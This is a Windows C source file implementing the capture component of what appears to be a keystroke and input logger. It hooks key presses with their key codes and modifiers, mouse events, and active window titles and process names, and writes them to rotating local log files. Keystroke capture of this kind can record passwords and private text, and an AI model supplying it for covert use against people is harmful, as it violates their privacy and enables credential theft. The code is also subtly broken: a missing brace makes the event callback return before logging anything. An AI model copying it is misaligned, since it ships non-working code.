#include "capture.h"
#include "logger.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

#ifdef DEBUG
    #define CAPTURE_DEBUG(msg, ...) fprintf(stderr, "[Capture] " msg "\n", ##__VA_ARGS__)
#else
    #define CAPTURE_DEBUG(msg, ...)
#endif

// Capture system state
typedef struct {
    CaptureConfig config;          // Current capture configuration
    CaptureStats stats;           // Capture statistics
    CRITICAL_SECTION lock;        // Synchronization for thread safety
    FILE* log_file;              // Current log file handle
    DWORD last_flush;            // Last flush timestamp
    bool initialized;            // Initialization flag
    bool active;                // Capture active flag
    DWORD last_error;           // Last error code
    char* buffer;               // Event buffer
    size_t buffer_size;         // Current buffer size
    size_t buffer_capacity;     // Maximum buffer size
} CaptureSystem;

static CaptureSystem capture = {0};

// Internal helpers used to manage various capture-related tasks
static bool open_log_file(void);
static void close_log_file(void);
static bool rotate_log_file(void);
static void format_event_entry(const Event* event, char* buffer, size_t size);
static bool write_event_to_file(const char* entry);
static bool should_rotate_log(void);
static bool create_log_directory(void);
static void update_flush_timer(void);
static bool should_flush(void);
static void set_capture_error(DWORD error);
static bool buffer_event_entry(const char* entry);
static bool flush_buffer_to_file(void);
static bool validate_config(const CaptureConfig* config);
static void cleanup_capture_internal(void);

// Called whenever an event (e.g., key press, mouse click) is captured by the hooks
static void capture_event_callback(const Event* event) {
    if (!capture.active || !event) 
    printf("[Capture] Callback received no event or capture is inactive.\n");
    return;

    EnterCriticalSection(&capture.lock);

    char entry[CAPTURE_MAX_ENTRY_SIZE];
    format_event_entry(event, entry, sizeof(entry));

    if (capture.config.buffer_events) {
        // Add event to the buffer
        if (buffer_event_entry(entry)) {
            capture.stats.events_buffered++;

            if (should_flush()) {
                flush_buffer_to_file();
            }
        } else {
            capture.stats.buffer_overflows++;
            CAPTURE_DEBUG("Buffer overflow occurred");
        }
    } else {
        if (write_event_to_file(entry)) {
            capture.stats.events_captured++;

            if (should_flush()) {
                fflush(capture.log_file);
                update_flush_timer();
            }
        }
    }

    // Rotate the log file if necessary
    if (should_rotate_log()) {
        rotate_log_file();
    }

    LeaveCriticalSection(&capture.lock);
}

// Sets up the capture system, including configuration, logging, and buffer allocation
bool init_capture(const CaptureConfig* config) {
    if (capture.initialized) {
        set_capture_error(CAPTURE_ERROR_INIT);
        return false;
    }

    // Initialize critical section for synchronization
    if (!InitializeCriticalSectionAndSpinCount(&capture.lock, 0x00000400)) {
        set_capture_error(CAPTURE_ERROR_INIT);
        return false;
    }

    EnterCriticalSection(&capture.lock);
    bool init_success = false;

    // Set default configuration if none provided
    if (config) {
        if (!validate_config(config)) {
            set_capture_error(CAPTURE_ERROR_INIT);
        } else {
            memcpy(&capture.config, config, sizeof(CaptureConfig));
            init_success = true;
        }
    } else {
        strncpy(capture.config.log_path, CAPTURE_DEFAULT_LOG, CAPTURE_MAX_PATH);
        capture.config.mode = CAPTURE_MODE_NORMAL;
        capture.config.flush_interval = CAPTURE_FLUSH_INTERVAL;
        capture.config.max_file_size = CAPTURE_MAX_FILE_SIZE;
        capture.config.rotate_logs = true;
        capture.config.encrypt_logs = false;
        capture.config.buffer_events = true;
        init_success = true;
    }

    // Allocate buffer if buffering is enabled
    if (init_success && capture.config.buffer_events) {
        capture.buffer_capacity = CAPTURE_BUFFER_SIZE;
        capture.buffer = (char*)malloc(capture.buffer_capacity);
        if (!capture.buffer) {
            set_capture_error(CAPTURE_ERROR_MEMORY);
            init_success = false;
        } else {
            capture.buffer_size = 0;
        }
    }

    // Create log directory and open log file
    if (init_success) {
        if (!create_log_directory() || !open_log_file()) {
            cleanup_capture_internal();
            set_capture_error(CAPTURE_ERROR_FILE);
            init_success = false;
        }
    }

    if (init_success) {
        memset(&capture.stats, 0, sizeof(CaptureStats));
        capture.initialized = true;
        capture.last_flush = GetTickCount();
        capture.last_error = CAPTURE_ERROR_NONE;

        CAPTURE_DEBUG("Capture system initialized");
    }

    LeaveCriticalSection(&capture.lock);

    if (!init_success) {
        DeleteCriticalSection(&capture.lock);
    }

    return init_success;
}

// Releases resources used by the capture system including buffer and log file
void cleanup_capture(void) {
    if (!capture.initialized) return;

    EnterCriticalSection(&capture.lock);

    if (capture.active) {
        stop_capture();
    }
    cleanup_capture_internal();

    LeaveCriticalSection(&capture.lock);
    DeleteCriticalSection(&capture.lock);
}


static void cleanup_capture_internal(void) {
    if (capture.buffer) {
        if (capture.buffer_size > 0) {
            flush_buffer_to_file();
        }
        free(capture.buffer);
        capture.buffer = NULL;
    }

    close_log_file();
    capture.initialized = false;
    capture.active = false;
    capture.buffer_size = 0;
    capture.buffer_capacity = 0;

    CAPTURE_DEBUG("Capture system cleaned up");
}

// Registers hooks and starts processing events
bool start_capture(void) {
    if (!capture.initialized || capture.active) {
        set_capture_error(CAPTURE_ERROR_INIT);
        printf("[Capture] Start capture failed: Not initialized or already active.\n");
        return false;
    }

    EnterCriticalSection(&capture.lock);

    if (!register_hook_callback(capture_event_callback)) {
        set_capture_error(CAPTURE_ERROR_HOOKS);
        printf("[Capture] Failed to register hook callback.\n");
        LeaveCriticalSection(&capture.lock);
        return false;
    }

    capture.active = true;
    capture.last_flush = GetTickCount();
    CAPTURE_DEBUG("Capture started");

    LeaveCriticalSection(&capture.lock);
    return true;
}

// Unregisters hooks and stops processing events
void stop_capture(void) {
    if (!capture.active) return;

    EnterCriticalSection(&capture.lock);

    unregister_hook_callback(capture_event_callback);

    if (capture.buffer_size > 0) {
        flush_buffer_to_file();
    }

    if (capture.log_file) {
        fflush(capture.log_file);
    }

    capture.active = false;
    CAPTURE_DEBUG("Capture stopped");

    LeaveCriticalSection(&capture.lock);
}

static bool open_log_file(void) {
    char full_path[CAPTURE_MAX_PATH + 10];
    snprintf(full_path, sizeof(full_path), "%s/%s", 
             CAPTURE_LOG_DIR, capture.config.log_path);

    printf("[Capture] Opening log file: %s\n", full_path);
    capture.log_file = fopen(full_path, "ab");
    if (!capture.log_file) {
        set_capture_error(CAPTURE_ERROR_FILE);
        CAPTURE_DEBUG("Failed to open log file: %s", full_path);
        return false;
    }

    return true;
}

static void close_log_file(void) {
    if (capture.log_file) {
        fflush(capture.log_file);
        fclose(capture.log_file);
        capture.log_file = NULL;
    }
}

static bool rotate_log_file(void) {
    if (!capture.config.rotate_logs || !capture.log_file) return false;

    char timestamp[64];
    SYSTEMTIME st;
    GetLocalTime(&st);
    snprintf(timestamp, sizeof(timestamp), "%04d%02d%02d_%02d%02d%02d",
             st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);

    char old_path[512];
    char new_path[512];

    int written = snprintf(old_path, sizeof(old_path), "%s/%s", 
                           CAPTURE_LOG_DIR, capture.config.log_path);
    if (written < 0 || (size_t)written >= sizeof(old_path)) {
        CAPTURE_DEBUG("Buffer overflow detected in old_path");
        return false;
    }

    written = snprintf(new_path, sizeof(new_path), "%s/%s.%s", 
                       CAPTURE_LOG_DIR, capture.config.log_path, timestamp);
    if (written < 0 || (size_t)written >= sizeof(new_path)) {
        CAPTURE_DEBUG("Buffer overflow detected in new_path");
        return false;
    }

    close_log_file();

    if (rename(old_path, new_path) == 0) {
        capture.stats.files_rotated++;
        return open_log_file();
    }

    CAPTURE_DEBUG("Failed to rotate log file");
    return false;
}

static void format_event_entry(const Event* event, char* buffer, size_t size) {
    if (!event || !buffer || size == 0) return;

    char timestamp[32];
    SYSTEMTIME st;
    GetLocalTime(&st);
    
    int written = snprintf(timestamp, sizeof(timestamp),
                       "%04d-%02d-%02d %02d:%02d:%02d.%03hu",
                       st.wYear, st.wMonth, st.wDay,
                       st.wHour, st.wMinute, st.wSecond,
                       (unsigned short)st.wMilliseconds);

    if (written < 0 || (size_t)written >= sizeof(timestamp)) {
        CAPTURE_DEBUG("Timestamp buffer overflow in format_event_entry");
        timestamp[0] = '\0';
    }

    switch (event->type) {
        case EVENT_KEY_PRESS:
        case EVENT_KEY_RELEASE:
            snprintf(buffer, size,
                    "[%s] KEY %s VK:0x%04lX SC:0x%04lX%s%s%s%s\n",
                    timestamp,
                    event->type == EVENT_KEY_PRESS ? "DOWN" : "UP",
                    event->data.keyboard.vkCode,
                    event->data.keyboard.scanCode,
                    event->data.keyboard.alt ? " ALT" : "",
                    event->data.keyboard.control ? " CTRL" : "",
                    event->data.keyboard.shift ? " SHIFT" : "",
                    event->data.keyboard.win ? " WIN" : "");
            break;

        case EVENT_MOUSE_CLICK:
        case EVENT_MOUSE_MOVE:
        case EVENT_MOUSE_WHEEL:
            snprintf(buffer, size,
                    "[%s] MOUSE %s X:%ld Y:%ld BTN:%s%s%s WHL:%d\n",
                    timestamp,
                    event->type == EVENT_MOUSE_CLICK ? "CLICK" :
                    event->type == EVENT_MOUSE_MOVE ? "MOVE" : "WHEEL",
                    event->data.mouse.position.x,
                    event->data.mouse.position.y,
                    event->data.mouse.leftButton ? " LEFT" : "",
                    event->data.mouse.rightButton ? " RIGHT" : "",
                    event->data.mouse.middleButton ? " MIDDLE" : "",
                    event->data.mouse.wheelDelta);
            break;

        case EVENT_WINDOW_CHANGE:
            snprintf(buffer, size,
                    "[%s] WINDOW TITLE:'%s' PROCESS:'%s' PID:%lu\n",
                    timestamp,
                    event->data.window.title,
                    event->data.window.process,
                    event->data.window.processId);
            break;

        default:
            buffer[0] = '\0';
            break;
    }
}

static bool write_event_to_file(const char* entry) {
    if (!entry || !capture.log_file) {
        set_capture_error(CAPTURE_ERROR_FILE);
        return false;
    }

    size_t len = strlen(entry);
    if (fwrite(entry, 1, len, capture.log_file) != len) {
        capture.stats.write_errors++;
        CAPTURE_DEBUG("Failed to write event to log");
        return false;
    }

    capture.stats.bytes_written += len;
    return true;
}

static bool buffer_event_entry(const char* entry) {
    if (!entry || !capture.buffer) {
        set_capture_error(CAPTURE_ERROR_BUFFER);
    return false;
    }
    
    size_t len = strlen(entry);
    if (capture.buffer_size + len >= capture.buffer_capacity) {
        if (!flush_buffer_to_file()) {
            return false;
        }
    }
    
    memcpy(capture.buffer + capture.buffer_size, entry, len);
    capture.buffer_size += len;
    return true;
}

static bool flush_buffer_to_file(void) {
    if (!capture.buffer || capture.buffer_size == 0) return true;
    if (!capture.log_file) {
        set_capture_error(CAPTURE_ERROR_FILE);
        return false;
    }
    
    if (capture.config.encrypt_logs) {
        // TODO: Implement encryption before writing
        CAPTURE_DEBUG("Encryption not yet implemented");
    }
    
    size_t written = fwrite(capture.buffer, 1, capture.buffer_size, capture.log_file);
    if (written != capture.buffer_size) {
        set_capture_error(CAPTURE_ERROR_FILE);
        capture.stats.write_errors++;
        CAPTURE_DEBUG("Failed to flush buffer: %zu/%zu bytes written", 
                     written, capture.buffer_size);
        return false;
    }
    
    capture.stats.bytes_written += capture.buffer_size;
    capture.buffer_size = 0;
    update_flush_timer();
    return true;
}

static bool should_rotate_log(void) {
    if (!capture.config.rotate_logs || !capture.log_file) return false;
    
    size_t file_size = (size_t)ftell(capture.log_file);
    return file_size >= capture.config.max_file_size;
}

static bool create_log_directory(void) {
    printf("[Capture] Creating log directory: %s\n", CAPTURE_LOG_DIR);
    if (CreateDirectoryA(CAPTURE_LOG_DIR, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
        return true;
    }
    
    CAPTURE_DEBUG("Failed to create log directory");
    return false;
}

static void update_flush_timer(void) {
    capture.last_flush = GetTickCount();
}

static bool should_flush(void) {
    if (capture.config.mode == CAPTURE_MODE_DEBUG) return true;
    
    DWORD now = GetTickCount();
    DWORD elapsed = now - capture.last_flush;
    return elapsed >= capture.config.flush_interval;
}

static void set_capture_error(DWORD error) {
    capture.last_error = error;
    CAPTURE_DEBUG("Capture error set: %u", error);
}

static bool validate_config(const CaptureConfig* config) {
    if (!config) return false;
    
    if (config->buffer_events && config->max_file_size < CAPTURE_BUFFER_SIZE) {
        return false;
    }
    
    if (strlen(config->log_path) == 0 || 
        strlen(config->log_path) >= CAPTURE_MAX_PATH) {
        return false;
    }
    
    if (config->flush_interval == 0 || 
        config->max_file_size == 0) {
        return false;
    }
    
    return true;
}

// Public interface implementations
void set_capture_config(const CaptureConfig* config) {
    if (!config) return;
    
    EnterCriticalSection(&capture.lock);
    memcpy(&capture.config, config, sizeof(CaptureConfig));
    LeaveCriticalSection(&capture.lock);
}

void get_capture_config(CaptureConfig* config) {
    if (!config) return;
    
    EnterCriticalSection(&capture.lock);
    memcpy(config, &capture.config, sizeof(CaptureConfig));
    LeaveCriticalSection(&capture.lock);
}

void get_capture_stats(CaptureStats* stats) {
    if (!stats) return;
    
    EnterCriticalSection(&capture.lock);
    memcpy(stats, &capture.stats, sizeof(CaptureStats));
    LeaveCriticalSection(&capture.lock);
}

bool is_capture_active(void) {
    EnterCriticalSection(&capture.lock);
    bool active = capture.active;
    LeaveCriticalSection(&capture.lock);
    return active;
}

DWORD get_capture_error(void) {
    return capture.last_error;
}

bool flush_capture_buffer(void) {
    if (!capture.initialized) return false;
    
    EnterCriticalSection(&capture.lock);
    bool result = flush_buffer_to_file();
    LeaveCriticalSection(&capture.lock);
    
    return result;
}

bool is_capture_buffer_full(void) {
    if (!capture.initialized || !capture.buffer) return true;
    
    EnterCriticalSection(&capture.lock);
    bool full = capture.buffer_size >= capture.buffer_capacity;
    LeaveCriticalSection(&capture.lock);
    
    return full;
}